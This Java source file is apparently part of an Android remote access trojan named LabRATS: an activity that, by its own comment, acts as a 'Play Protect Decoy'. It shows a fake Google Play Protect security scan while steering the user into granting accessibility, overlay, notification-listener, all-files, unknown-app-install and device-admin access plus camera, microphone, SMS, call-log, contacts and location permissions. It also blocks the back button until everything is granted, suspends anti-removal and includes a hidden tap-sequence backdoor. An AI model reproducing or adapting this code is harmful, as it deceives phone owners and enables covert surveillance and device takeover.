package com.labs.labrats;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.material.button.MaterialButton;

import java.util.ArrayList;
import java.util.List;

/**
 * High-Fidelity Play Protect Decoy for permissions.
 * Streamlined: Uses Accessibility guide overlay for service enablement, then directly triggers
 * settings intents on Play Protect verifying UI while Ghost AutoPilot handles switch toggles.
 */
public class PermissionActivity extends AppCompatActivity {

    private static final String TAG = "PermissionActivity";
    private static final int PERMISSION_REQUEST_CODE = 2001;

    private boolean isAnimationRunning = false;
    private boolean hasScanned = false;
    private boolean hasAttemptedFiles = false;
    private boolean hasAttemptedInstall = false;
    private String currentLayoutType = "";
    private final Handler chainHandler = new Handler(Looper.getMainLooper());

    public static boolean isAccessibilityServiceEnabled(Context context) {
        if (IO_Persistence_Manager.getInstance() != null) {
            context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("acc_granted", true).apply();
            return true;
        }

        if (context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("acc_granted", false)) {
            return true;
        }

        try {
            String pkg = context.getPackageName();
            String enabledServices = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (enabledServices != null && (enabledServices.contains(pkg) || enabledServices.contains("IO_Persistence_Manager") || enabledServices.contains("com.labs.labrats"))) {
                context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("acc_granted", true).apply();
                return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    public static boolean isNotificationServiceEnabled(Context context) {
        if (context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("notif_granted", false)) {
            return true;
        }

        try {
            String pkgName = context.getPackageName();
            final String flat = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
            if (flat != null && !flat.isEmpty()) {
                if (flat.contains(pkgName) || flat.contains("StatusNotification") || flat.contains("com.labs.labrats") || flat.contains("com.android.system.stability")) {
                    context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("notif_granted", true).apply();
                    return true;
                }
                for (String name : flat.split(":")) {
                    ComponentName cn = ComponentName.unflattenFromString(name);
                    if (cn != null && pkgName.equals(cn.getPackageName())) {
                        context.getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("notif_granted", true).apply();
                        return true;
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // SUSPEND ANTI-REMOVAL
        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();

        if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
            openAdminSettings();
            finish();
            return;
        }
        
        boolean accMissing = !isAccessibilityServiceEnabled(this);
        if (!hasScanned && (accMissing || !areRuntimePermissionsGranted())) {
            setupScanningUI();
        } else {
            checkSpecialChain();
        }
        
        handleInstructions(getIntent());
    }

    private void setupScanningUI() {
        if (isAnimationRunning) return;
        setTheme(R.style.Theme_LabRATS_Permissions);
        setContentView(R.layout.activity_guide_permission);
        currentLayoutType = "scanning";

        ProgressBar pb = findViewById(R.id.pbPlayProtect);
        TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
        TextView tvSub = findViewById(R.id.tvPlayProtectSub);

        isAnimationRunning = true;
        final long startTime = android.os.SystemClock.elapsedRealtime();
        final long totalDuration = 2800; // Calmer 2.8s scan delay (~30% longer)

        chainHandler.post(new Runnable() {
            @Override
            public void run() {
                if (isFinishing() || isDestroyed() || !"scanning".equals(currentLayoutType)) return;
                
                long elapsed = android.os.SystemClock.elapsedRealtime() - startTime;
                int progress = (int) Math.min(100, (elapsed * 100) / totalDuration);
                
                if (pb != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        pb.setProgress(progress, true);
                    } else {
                        pb.setProgress(progress);
                    }
                }
                if (tvDetails != null) {
                    if (progress < 30) tvDetails.setText("Initializing security environment...");
                    else if (progress < 60) tvDetails.setText("Analyzing security modules...");
                    else if (progress < 85) tvDetails.setText("Checking for restricted access...");
                    else tvDetails.setText("Finalizing report...");
                }
                if (progress > 40 && tvSub != null) tvSub.setText("Verifying environment...");

                if (progress < 100) {
                    chainHandler.postDelayed(this, 16); // 60 FPS update
                } else {
                    isAnimationRunning = false;
                    hasScanned = true;
                    checkSpecialChain();
                }
            }
        });
    }

    private int currentScanProgress = 20;

    private void ensureVerifyingUI() {
        if (!"verifying".equals(currentLayoutType)) {
            setContentView(R.layout.activity_guide_permission);
            currentLayoutType = "verifying";
            ProgressBar pb = findViewById(R.id.pbPlayProtect);
            TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
            TextView tvSub = findViewById(R.id.tvPlayProtectSub);
            if (pb != null) pb.setProgress(currentScanProgress);
            if (tvDetails != null) tvDetails.setText("Verifying security environment...");
            if (tvSub != null) tvSub.setText("Verifying environment...");
        }
    }

    private void updateVerifyingUI(int targetProgress, String detailText) {
        ensureVerifyingUI();
        ProgressBar pb = findViewById(R.id.pbPlayProtect);
        TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
        TextView tvSub = findViewById(R.id.tvPlayProtectSub);

        if (tvDetails != null) {
            tvDetails.setText(detailText);
            tvDetails.setAlpha(0.3f);
            tvDetails.animate().alpha(1.0f).setDuration(300).start();
        }
        if (tvSub != null) tvSub.setText("Verifying environment...");

        final int startProg = currentScanProgress;
        final long startTime = android.os.SystemClock.elapsedRealtime();
        final long animDuration = 900; // Silky smooth 900ms loading step

        chainHandler.removeCallbacksAndMessages(null);
        chainHandler.post(new Runnable() {
            @Override
            public void run() {
                if (isFinishing() || isDestroyed()) return;
                long elapsed = android.os.SystemClock.elapsedRealtime() - startTime;
                float fraction = Math.min(1.0f, (float) elapsed / animDuration);
                int progress = startProg + (int) ((targetProgress - startProg) * fraction);
                currentScanProgress = progress;

                if (pb != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        pb.setProgress(progress, true);
                    } else {
                        pb.setProgress(progress);
                    }
                }

                if (fraction < 1.0f) {
                    chainHandler.postDelayed(this, 16);
                }
            }
        });
    }

    private void requestMissingBatch() {
        ensureVerifyingUI();
        List<String> perms = getNeededPermissions();
        if (!perms.isEmpty()) {
            ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            checkSpecialChain();
        }
    }

    private void checkSpecialChain() {
        if (isFinishing() || isDestroyed()) return;

        chainHandler.removeCallbacksAndMessages(null);
        chainHandler.postDelayed(() -> {
            if (isFinishing() || isDestroyed()) return;

            boolean accMissing = !isAccessibilityServiceEnabled(this);
            boolean runtimeMissing = !areRuntimePermissionsGranted();
            boolean overlayMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this);
            boolean notifMissing = !isNotificationServiceEnabled(this);
            boolean filesMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager() && !hasAttemptedFiles;
            boolean installMissing = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls() && !hasAttemptedInstall;

            // FAST DIRECT PIPELINE: 200ms Lightning Dispatch
            if (accMissing) {
                showAccessibilityGuide();
            } else if (runtimeMissing) {
                updateVerifyingUI(35, "Verifying runtime security permissions...");
                chainHandler.postDelayed(this::requestMissingBatch, 200);
            } else if (overlayMissing) {
                updateVerifyingUI(55, "Checking display over other apps...");
                chainHandler.postDelayed(this::openOverlaySettings, 200);
            } else if (notifMissing) {
                updateVerifyingUI(75, "Verifying notification listener access...");
                chainHandler.postDelayed(this::openNotificationSettings, 200);
            } else if (filesMissing) {
                hasAttemptedFiles = true;
                updateVerifyingUI(88, "Checking file storage access...");
                chainHandler.postDelayed(this::openFilesSettings, 200);
            } else if (installMissing) {
                hasAttemptedInstall = true;
                updateVerifyingUI(96, "Checking package installation access...");
                chainHandler.postDelayed(this::openInstallSettings, 200);
            } else {
                IO_Persistence_Manager.setAutoPilot(false);
                updateVerifyingUI(100, "Security scan complete.");
                // Pause for 0.8 second after scan reaches 100%, then pop up completion text & FINISH button
                chainHandler.postDelayed(this::showCompletionUI, 800);
            }
        }, 200);
    }

    private void showCompletionUI() {
        if (isFinishing() || isDestroyed()) return;

        currentLayoutType = "completed";

        ProgressBar pb = findViewById(R.id.pbPlayProtect);
        TextView tvSub = findViewById(R.id.tvPlayProtectSub);
        TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
        View robot = findViewById(R.id.ivPlayProtectRobot);
        View btnBack = findViewById(R.id.btnOverlayBack);
        MaterialButton btnFinish = findViewById(R.id.btnFinishDecoy);

        if (pb != null) {
            pb.setProgress(100);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                pb.setProgressTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
            }
        }

        if (tvSub != null) {
            tvSub.setAlpha(0.2f);
            tvSub.setText("✔  System is up to date");
            tvSub.setTextColor(android.graphics.Color.parseColor("#137333")); // Play Protect Dark Green
            tvSub.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 20);
            tvSub.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
            tvSub.animate().alpha(1.0f).setDuration(350).start();
            tvSub.setOnClickListener(v -> handleBackdoorClick());
        }

        if (tvDetails != null) {
            tvDetails.setAlpha(0.2f);
            tvDetails.setText("No harmful apps found • Last scanned: Just now");
            tvDetails.setTextColor(android.graphics.Color.parseColor("#5F6368"));
            tvDetails.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 15);
            tvDetails.animate().alpha(1.0f).setDuration(350).start();
            tvDetails.setOnClickListener(v -> handleBackdoorClick());
        }

        if (robot != null) {
            robot.setOnClickListener(v -> handleBackdoorClick());
        }

        if (btnBack != null) {
            btnBack.setVisibility(View.VISIBLE);
            btnBack.setAlpha(0f);
            btnBack.animate().alpha(1.0f).setDuration(350).start();
            btnBack.setOnClickListener(v -> goHome());
        }

        if (btnFinish != null) {
            btnFinish.setVisibility(View.VISIBLE);
            btnFinish.setAlpha(0f);
            btnFinish.setScaleX(0.85f);
            btnFinish.setScaleY(0.85f);
            btnFinish.animate().alpha(1.0f).scaleX(1.0f).scaleY(1.0f).setDuration(400).start();
            btnFinish.setOnClickListener(v -> goHome());
        }
    }

    private int clickCount = 0;
    private long lastClickTime = 0;

    private void handleBackdoorClick() {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastClickTime < 500) clickCount++;
        else clickCount = 1;
        lastClickTime = currentTime;
        if (clickCount >= 10) {
            Intent intent = new Intent(this, MainActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            clickCount = 0;
            finish();
        }
    }

    private void goHome() {
        try {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(home);
        } catch (Exception ignored) {}
        finish();
    }

    private void showAccessibilityGuide() {
        if ("accessibility".equals(currentLayoutType)) return;
        
        chainHandler.removeCallbacksAndMessages(null);

        setContentView(R.layout.activity_guide_accessibility);
        currentLayoutType = "accessibility";

        View content = findViewById(android.R.id.content);
        if (content != null) {
            content.setAlpha(0f);
            content.animate().alpha(1f).setDuration(200).start();
        }

        MaterialButton btn = findViewById(R.id.btnGuideAction);
        if (btn != null) {
            btn.setOnClickListener(v -> openAccessibilitySettings());
        }
    }

    @Override
    public void onBackPressed() {
        if (allStandardGranted()) {
            super.onBackPressed();
        } else {
            checkSpecialChain();
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleInstructions(intent);
    }

    private void handleInstructions(Intent intent) {
        if (intent == null) return;
        String target = intent.getStringExtra("target_menu");
        if (target == null) return;

        chainHandler.postDelayed(() -> {
            if (target.equals("accessibility")) openAccessibilitySettings();
            else if (target.equals("notifications")) openNotificationSettings();
        }, 300);
    }

    private void openAccessibilitySettings() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                Intent intent = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
                ComponentName cn = new ComponentName(this, IO_Persistence_Manager.class);
                intent.putExtra(Intent.EXTRA_COMPONENT_NAME, cn.flattenToString());
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
                return;
            }
        } catch (Exception ignored) {}

        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private void openNotificationSettings() {
        try {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private void openOverlaySettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
            startActivity(intent);
        } catch (Exception e) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
            } catch (Exception ignored) {}
        }
    }

    private void openFilesSettings() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
            }
        } catch (Exception e) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(intent);
                }
            } catch (Exception ignored) {}
        }
    }

    private void openInstallSettings() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
            }
        } catch (Exception e) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(intent);
                }
            } catch (Exception ignored) {}
        }
    }

    private boolean isDeviceAdminActive() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, StabilityPolicy.class);
            return dpm != null && dpm.isAdminActive(admin);
        } catch (Exception e) {
            return false;
        }
    }

    private void openAdminSettings() {
        try {
            IO_Persistence_Manager.stopSmartExit();
            ComponentName admin = new ComponentName(this, StabilityPolicy.class);
            Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    @Override
    protected void onDestroy() {
        chainHandler.removeCallbacksAndMessages(null);
        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", false).apply();
        super.onDestroy();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        checkSpecialChain();
    }

    @Override
    protected void onResume() {
        super.onResume();

        // If Accessibility was enabled, switch layout immediately before window draws (0ms delay)
        if (isAccessibilityServiceEnabled(this) && "accessibility".equals(currentLayoutType)) {
            ensureVerifyingUI();
        }

        if (allStandardGranted()) {
            IO_Persistence_Manager.setAutoPilot(false);
            if (!"completed".equals(currentLayoutType)) {
                checkSpecialChain();
            }
        } else if (!hasScanned && !isAnimationRunning && !"scanning".equals(currentLayoutType)) {
            setupScanningUI();
        } else {
            checkSpecialChain();
        }
    }

    private List<String> getNeededPermissions() {
        List<String> needed = new ArrayList<>();
        String[] perms = {
            Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS
        };

        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ANSWER_PHONE_CALLS) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.ANSWER_PHONE_CALLS);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_PHONE_NUMBERS);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_MEDIA_IMAGES);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_MEDIA_VIDEO);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED)
                needed.add(Manifest.permission.READ_MEDIA_AUDIO);
        }
        return needed;
    }

    private boolean areRuntimePermissionsGranted() {
        return getNeededPermissions().isEmpty();
    }

    private boolean allStandardGranted() {
        if (!areRuntimePermissionsGranted()) return false;
        if (!isAccessibilityServiceEnabled(this)) return false;
        if (!isNotificationServiceEnabled(this)) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !android.os.Environment.isExternalStorageManager()) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls()) return false;
        return true;
    }
}
